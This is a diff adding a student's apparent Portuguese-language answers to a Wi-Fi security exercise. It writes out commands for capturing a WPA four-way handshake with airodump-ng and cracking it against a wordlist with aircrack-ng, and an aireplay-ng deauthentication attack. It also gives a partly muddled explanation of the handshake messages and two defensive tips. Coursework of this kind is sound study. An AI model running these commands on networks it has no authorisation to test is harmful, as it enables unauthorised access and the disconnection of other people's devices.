@@ -1,0 +1,36 @@
+
+Questão 1.1:
+
+*Criar interface monitor: 
+	$sudo iw dev wls2 add mon0 type monitor 
+*$sudo airodump-ng mon0
+	-desconecta internet do celular
+* $sudo airodump-ng –bssid 00:21:8D:25:1D:09 mon0 -w meuarquivo
+	-conectar internet no celular, para tentar capturar as '4 Key message' - handshake
+*Criar arquivo com possíveis senhas: 
+	$sudo nano meuarquivodesenha.psk
+*Abrir meuarquivo.cap no wireshark para ver se o handshake foi capturado (key 01 de 04…)
+*Filtrar/ descobrir a senha: 
+	$sudo aircrack-ng -w meuarquivodesenha.psk  00:21:8D:25:1D:09 meuarquivo.cap
+
+Questão 1.2:
+*Key (Message 1 of 4) - a primeira mensagem é enviada de AP para cliente, esta mensagem inclui um número aleatório, como
+ANonce para geração de PTK no cliente;
+*Key (Message 2 of 4) - responde à primeira mensagem da tecla EAP, o cliente envia o SNonce >> O AP informa o cliente 
+sobre a instalação do PTK e o contador de seqüência de recepção;
+*Key (Message 3 of 4) - A mensagem 3 é a última mensagem de chave não criptografada > informa o cliente sobre a instalação 
+do PTK e o contador de seqüência de recepção;
+*Key (Message 4 of 4) - reconhece a instalação do PTK.
+
+Questão 1.3:
+airmon-ng start (placa wifi) 
+ifconfig (placa) 
+down iwconfig (placa) 
+mode monitor ifconfig (placa) 
+up airodump-ng (placa) aireplay-ng -a MAC mon0 -0 0 (Se der erro use o --ignore-negative-one) 
+CTRL+C para o ataque.
+
+Questão 1.4:
+01) modificar o nome do computador para dificultar que reconheçam sua maquina com facilidade 
+02) utilizar uma "senha forte"
+
